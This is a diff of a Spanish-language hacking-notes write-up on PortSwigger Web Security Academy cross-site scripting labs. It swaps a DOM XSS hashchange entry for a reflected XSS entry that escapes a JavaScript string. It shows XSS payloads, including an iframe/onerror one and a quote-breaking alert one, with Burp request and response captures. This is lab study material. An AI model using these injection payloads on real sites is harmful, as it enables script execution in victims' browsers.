@@ -15,19 +15,22 @@
 *   [x] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
-    SCRIPT:
+    SCRIPT QUE REFLEJA NUESTRA CONSULTA:
 
 
-    $(window).on('hashchange', function(){
-        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + 
-    ')');
-        if (post) post.get(0).scrollIntoView();
-    });
+
+
+    <script>
+                            var searchTerms = 'XXXXXX';
+                            document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+    </script> 
     ```
 
-    ![DOM-XSSenSelectorEventoHASHCHANGE](https://github.com/MammaniNelsonD/P4IM0N\_H4CKING/assets/114308492/a170860c-2a92-4d05-ad6e-8c8978af4742)
+    ![XSS-reflejadoenJavascriptconcorchetesanguleresSCRIPT-HTML](https://github.com/MammaniNelsonD/P4IM0N_H4CKING/assets/114308492/c969f03d-519d-46d4-9772-4988164ca330)
 
-    * CONCLUSION: ENCONTRAMOS EN EL HTML DEL HOME EL SCRIPT QUE MANEJA EL SELECTOR JQUERY EN EL EVENTO HASHCHANGE.
+    ![XSS-reflejadoenJavascriptconcorchetesanguleresEJECUCION-ALERT](https://github.com/MammaniNelsonD/P4IM0N_H4CKING/assets/114308492/80f01ac1-c77b-4a42-9e9c-a9bc53f916f1)
+
+    * CONCLUSION: CONSTATAMOS QUE SE REFLEJABA NUESTRA BUSQUEDA EN UN SCRIPT DENTRO DEL HTML POR LO QUE INTENTAMOS ESCAPAR DENTRO DE EL CON EL SIGUIENTE PAYLOAD    HOLA';javascript:alert('P4IM0N-XSS');//     EL CUAL PRIMERO USAMOS UNA CARGA CUALQUIERA (HOLA) LUEGO REALIZAMOS EL CIERRE (') CON (;) FINALIZAMOS ESA LINEA, Y LUEGO CON javascript:alert('P4IM0N-XSS') EVITAMOS USAR LOS CORCHETESS ANGULARES (><) POR QUE LOS CODIFICA, Y LUEGO COMENTAMOS EL FINAL CON (//), LOGRANDO EL ESCAPE DE NUESTRO CODIGO Y SU EJECUCION DEL ALERT. 
 
 ***
 
@@ -1259,13 +1262,16 @@
 
 #### SCRIPT DE EXPLOIT Y PAYLOADS
 
-*   [x] PORTSWIGGER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
+*   [x] PROPIO👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
-    <iframe src="https://0a96001003dc9730810d5ce400eb00b6.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+    PAYLOAD:
+
+
+    HOLA';javascript:alert('P4IM0N-XSS');//
     ```
 
-    * CONCLUSION:NO SE TERMINO DE COMPRENDER BIEN LA EJECUCION; PERO TUVIMOS QUE MANDAR ESTA CARGA UTIL DESDE NEUSTRO SERVIDOR MALISIOSO A LA VICTIMA Y A ESTA SE ELE EJECUTARIA LAS OPCIONES DE IMPRECION DE LA URL INDICADA EN SRC Y NADAD MAS; SE COMPLICO HASTA QUE AL FIN LO TOMO EL LABORATORIO, LUEGO DE PROBAR MUCHAS CARGAS POR NUESTRA CUENTA.
+    * CONCLUSION:INTENTAMOS ESCAPAR DE CADA ETIQUETA Y LINEADE CODIGO PARA LOGAR LA EJECUCION.
 
 ***
 
@@ -1284,59 +1290,87 @@
 *   [x] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)
 
     ```python
-    REQUEST NORMAL :
-
-
-
-
-    GET /post?postId=5 HTTP/2
-    Host: 0a96001003dc9730810d5ce400eb00b6.web-security-academy.net
-    Cookie: session=hrpstTIw3ZNzjsMATxZisZXH5xrq9PVC
-    Cache-Control: max-age=0
-    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
-    Sec-Ch-Ua-Mobile: ?0
-    Sec-Ch-Ua-Platform: "Linux"
-    Upgrade-Insecure-Requests: 1
-    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
-    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-    Sec-Fetch-Site: same-origin
-    Sec-Fetch-Mode: navigate
-    Sec-Fetch-User: ?1
-    Sec-Fetch-Dest: document
-    Referer: https://0a96001003dc9730810d5ce400eb00b6.web-security-academy.net/
-    Accept-Encoding: gzip, deflate, br
-    Accept-Language: es-419,es;q=0.9,en;q=0.8
-
-
-
-
-
-    RESPONSE NORMAL:
-
-
-
-    HTTP/2 200 OK
-    Content-Type: text/html; charset=utf-8
-    Content-Length: 7088
-
-    <!DOCTYPE html>
-    <html>
-        <head>
-            <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
-            <link href=/resources/css/labsBlog.css rel=stylesheet>
-            <title>DOM XSS in jQuery selector sink using a hashchange event</title>
-        </head>
-        <body>
-            <script src="/resources/labheader/js/labHeader.js"></script>
-            <div id="academyLabHeader">
-                <section class='academyLabBanner'>
-                    <div class=container>
-                        <div class=logo></div>
-                            <div class=title-container>
-                                <h2>DOM XSS in jQuery selector sink using a hashchange event</h2>
-                                <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ae00026033497c481d25bd20118000d.exploit-server.net'>Go to exploit server</a>
-                                <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event'>
-                                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+            REQUEST NORMAL:
+        
+        
+        GET /?search=P4IM0N HTTP/2
+        Host: 0a6900c70359b3a4809d85bb000900dc.web-security-academy.net
+        Cookie: session=wI0tXUiKCMYnO2b02ryXZOSBHHfHpyqQ
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate, br
+        Referer: https://0a6900c70359b3a4809d85bb000900dc.web-security-academy.net/
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-User: ?1
+        Te: trailers
+        
+        
+        
+        RESPONSE NORMAL:
+        
+        HTTP/2 200 OK
+        Content-Type: text/html; charset=utf-8
+        X-Frame-Options: SAMEORIGIN
+        Content-Length: 6623
+        
+        <!DOCTYPE html>
+        <html>
+            <head>
+                <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+                <link href=/resources/css/labsBlog.css rel=stylesheet>
+                <title>Reflected XSS into a JavaScript string with angle brackets HTML encoded</title>
+            </head>
+            <body>
+                <script src="/resources/labheader/js/labHeader.js"></script>
+                <div id="academyLabHeader">
+                    <section class='academyLabBanner is-solved'>
+                        <div class=container>
+                            <div class=logo></div>
+                                <div class=title-container>
+                                    <h2>Reflected XSS into a JavaScript string with angle brackets HTML encoded</h2>
+                                    <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded'>
+                                        Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                        <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                            <g>
+                                                <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                                <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                            </g>
+                                        </svg>
+                                    </a>
+                                </div>
+                                <div class='widgetcontainer-lab-status is-solved'>
+                                    <span>LAB</span>
+                                    <p>Solved</p>
+                                    <span class=lab-status-icon></span>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+                    <section id=notification-labsolved class=notification-labsolved>
+                        <div class=container>
+                            <h4>Congratulations, you solved the lab!</h4>
+                            <div>
+                                <span>
+                                    Share your skills!
+                                </span>
+                                <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aReflected+XSS+into+a+JavaScript+string+with+angle+brackets+HTML+encoded%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-javascript-string-angle-brackets-html-encoded&related=WebSecAcademy,Burp_Suite'>
+                            <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
+                                <title>twitter-button</title>
+                                <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
+                            </svg>
+                                </a>
+                                <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-javascript-string-angle-brackets-html-encoded'>
+                            <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                                <title>linkedin-button</title>
+                                <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
+                            </svg>
+                                </a>
+                                <a href='https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded'>
+                                    Continue learning 
                                     <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                         <g>
                                             <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
@@ -1345,82 +1379,186 @@
                                     </svg>
                                 </a>
                             </div>
-                            <div class='widgetcontainer-lab-status is-notsolved'>
-                                <span>LAB</span>
-                                <p>Not solved</p>
-                                <span class=lab-status-icon></span>
+                        </div>
+                    </section>
+                </div>
+                <div theme="blog">
+                    <section class="maincontainer">
+                        <div class="container is-page">
+                            <header class="navigation-header">
+                                <section class="top-links">
+                                    <a href=/>Home</a><p>|</p>
+                                </section>
+                            </header>
+                            <header class="notification-header">
+                            </header>
+                            <section class=blog-header>
+                                <h1>0 search results for 'P4IM0N'</h1>
+                                <hr>
+                            </section>
+                            <section class=search>
+                                <form action=/ method=GET>
+                                    <input type=text placeholder='Search the blog...' name=search>
+                                    <button type=submit class=button>Search</button>
+                                </form>
+                            </section>
+                            <script>
+                                var searchTerms = 'P4IM0N';
+                                document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+                            </script>
+                            <section class="blog-list no-results">
+                                <div class=is-linkback>
+                <a href="/">Back to Blog</a>
+                                </div>
+                            </section>
+                        </div>
+                    </section>
+                    <div class="footer-wrapper">
+                    </div>
+                </div>
+            </body>
+        </html>
+        
+        
+        -------
+        
+        
+        
+        REQUEST CON PAYLOAD:  HOLA';javascript:alert('P4IM0N-XSS');//
+        
+        
+        GET /?search=HOLA';javascript:alert('P4IM0N-XSS');// HTTP/2
+        Host: 0a6900c70359b3a4809d85bb000900dc.web-security-academy.net
+        Cookie: session=wI0tXUiKCMYnO2b02ryXZOSBHHfHpyqQ
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate, br
+        Referer: https://0a6900c70359b3a4809d85bb000900dc.web-security-academy.net/
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-User: ?1
+        Te: trailers
+        
+        
+        
+        
+        RESPONSE CON PAYLOAD:
+        
+        
+        
+        HTTP/2 200 OK
+        Content-Type: text/html; charset=utf-8
+        X-Frame-Options: SAMEORIGIN
+        Content-Length: 6793
+        
+        <!DOCTYPE html>
+        <html>
+            <head>
+                <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+                <link href=/resources/css/labsBlog.css rel=stylesheet>
+                <title>Reflected XSS into a JavaScript string with angle brackets HTML encoded</title>
+            </head>
+            <body>
+                <script src="/resources/labheader/js/labHeader.js"></script>
+                <div id="academyLabHeader">
+                    <section class='academyLabBanner is-solved'>
+                        <div class=container>
+                            <div class=logo></div>
+                                <div class=title-container>
+                                    <h2>Reflected XSS into a JavaScript string with angle brackets HTML encoded</h2>
+                                    <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded'>
+                                        Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                        <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                            <g>
+                                                <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                                <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                            </g>
+                                        </svg>
+                                    </a>
+                                </div>
+                                <div class='widgetcontainer-lab-status is-solved'>
+                                    <span>LAB</span>
+                                    <p>Solved</p>
+                                    <span class=lab-status-icon></span>
+                                </div>
                             </div>
                         </div>
-                    </div>
-                </section>
-            </div>
-            <div theme="blog">
-                <section class="maincontainer">
-                    <div class="container is-page">
-                        <header class="navigation-header">
-                            <section class="top-links">
-                                <a href=/>Home</a><p>|</p>
-                            </section>
-                        </header>
-                        <header class="notification-header">
-                        </header>
-                        <div class="blog-post">
-                        <img src="/image/blog/posts/57.jpg">
-                        <h1>Swipe Left Please</h1>
-                        <p><span id=blog-author>Scott Com</span> | 12 February 2024</p>
-                        <hr>
-                        <p>I don&apos;t know if you&apos;ve ever been on a dating site, but if you&apos;re female I&apos;d suggest you don&apos;t waste your time. And trust me, if you think by paying for a subscription you&apos;ll get a better selection of potential suitors, think again.</p>
-                        <p>The gallery of images looks like those books they whip out in CSI, a book of mugshots so a witness can identify the perpetrator. Honestly, they all look like convicts, mostly serial killers. I physically recoiled when I started browsing through. I don&apos;t want to appear mean, but I&apos;m thinking if you&apos;re looking to attract a female; a shave, maybe a shower, would be the right step before taking that selfie. And what&apos;s with the ski wear? Head covered, eyes covered by goggles, what are they trying to hide? If they think they look worse than the others, and are in disguise, I don&apos;t want to invite them to take the ski gear off.</p>
-                        <p>I took an unflattering photo, not easy for me as I&apos;m a big fan of the beauty filter. But, I was only there to see what goes on behind the scenes. My profile information offered up the bare minimum to meet the required word count. And yet, within the space of 5 minutes, I&apos;d had 25 views, one message, and a wink. That to me screams desperate. Trust me, my profile didn&apos;t suggest I was much of a catch.</p>
-                        <p>I couldn&apos;t read the message, if I wanted to I needed to put my hand in my wallet. I was teased with the first few words. It read, &apos;I can&apos;t because I&apos;m on a free trial&apos;. What a tight ass. If you want to communicate with me, don&apos;t send me a message I can&apos;t read so I have to shell out the money.</p>
-                        <p>There was a small part of me that momentarily thought it was a little bit exciting, and I might find a knight in shining armor. But not to be, 8 minutes in and I deleted my account.</p>
-                        <div/>
-                        <hr>
-                        <h1>Comments</h1>
-                        <section class="comment">
-                            <p>
-                            <img src="/resources/images/avatarDefault.svg" class="avatar">                            El Bow | 20 February 2024
-                            </p>
-                            <p>Could you do a blog on the needy? I want to show my husband he&apos;s always whining about nothing.</p>
-                            <p></p>
-                        </section>
-                        <section class="comment">
-                            <p>
-                            <img src="/resources/images/avatarDefault.svg" class="avatar">                            Peg Up | 01 March 2024
-                            </p>
-                            <p>I can&apos;t say I&apos;m surprised you wrote this.</p>
-                            <p></p>
-                        </section>
-                        <hr>
-                        <section class="add-comment">
-                            <h2>Leave a comment</h2>
-                            <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
-                                <input required type="hidden" name="csrf" value="Uy0SoJbkY9bWyecJrRz9nESJsH3BfCuB">
-                                <input required type="hidden" name="postId" value="5">
-                                <label>Comment:</label>
-                                <textarea required rows="12" cols="300" name="comment"></textarea>
-                                        <label>Name:</label>
-                                        <input required type="text" name="name">
-                                        <label>Email:</label>
-                                        <input required type="email" name="email">
-                                        <label>Website:</label>
-                                        <input pattern="(http:|https:).+" type="text" name="website">
-                                <button class="button" type="submit">Post Comment</button>
-                            </form>
-                        </section>
-                        <div class="is-linkback">
-                            <a href="/">Back to Blog</a>
+                    </section>
+                    <section id=notification-labsolved class=notification-labsolved-hidden>
+                        <div class=container>
+                            <h4>Congratulations, you solved the lab!</h4>
+                            <div>
+                                <span>
+                                    Share your skills!
+                                </span>
+                                <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aReflected+XSS+into+a+JavaScript+string+with+angle+brackets+HTML+encoded%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-javascript-string-angle-brackets-html-encoded&related=WebSecAcademy,Burp_Suite'>
+                            <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
+                                <title>twitter-button</title>
+                                <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
+                            </svg>
+                                </a>
+                                <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-javascript-string-angle-brackets-html-encoded'>
+                            <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                                <title>linkedin-button</title>
+                                <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
+                            </svg>
+                                </a>
+                                <a href='https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded'>
+                                    Continue learning 
+                                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                        <g>
+                                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                        </g>
+                                    </svg>
+                                </a>
+                            </div>
                         </div>
+                    </section>
+        
+                    <script src='/resources/labheader/js/completedLabHeader.js'></script>        </div>
+                <div theme="blog">
+                    <section class="maincontainer">
+                        <div class="container is-page">
+                            <header class="navigation-header">
+                                <section class="top-links">
+                                    <a href=/>Home</a><p>|</p>
+                                </section>
+                            </header>
+                            <header class="notification-header">
+                            </header>
+                            <section class=blog-header>
+                                <h1>0 search results for 'HOLA&apos;;javascript:alert(&apos;P4IM0N-XSS&apos;);//'</h1>
+                                <hr>
+                            </section>
+                            <section class=search>
+                                <form action=/ method=GET>
+                                    <input type=text placeholder='Search the blog...' name=search>
+                                    <button type=submit class=button>Search</button>
+                                </form>
+                            </section>
+                            <script>
+                                var searchTerms = 'HOLA';javascript:alert('P4IM0N-XSS');//';
+                                document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+                            </script>
+                            <section class="blog-list no-results">
+                                <div class=is-linkback>
+                <a href="/">Back to Blog</a>
+                                </div>
+                            </section>
+                        </div>
+                    </section>
+                    <div class="footer-wrapper">
                     </div>
-                </section>
-                <div class="footer-wrapper">
                 </div>
-            </div>
-        </body>
-    </html>
+            </body>
+        </html>
     ```
 
-    * CONCLUSION: NO SE OBSERVA NADA.
+    * CONCLUSION: CONSTATAMOS QUE SE REFLEJABA NUESTRA BUSQUEDA EN UN SCRIPT DENTRO DEL HTML POR LO QUE INTENTAMOS ESCAPAR DENTRO DE EL CON EL SIGUIENTE PAYLOAD    HOLA';javascript:alert('P4IM0N-XSS');//     EL CUAL PRIMERO USAMOS UNA CARGA CUALQUIERA (HOLA) LUEGO REALIZAMOS EL CIERRE (') CON (;) FINALIZAMOS ESA LINEA, Y LUEGO CON javascript:alert('P4IM0N-XSS') EVITAMOS USAR LOS CORCHETESS ANGULARES (><) POR QUE LOS CODIFICA, Y LUEGO COMENTAMOS EL FINAL CON (//), LOGRANDO EL ESCAPE DE NUESTRO CODIGO Y SU EJECUCION DEL ALERT. 
 
 ***
 
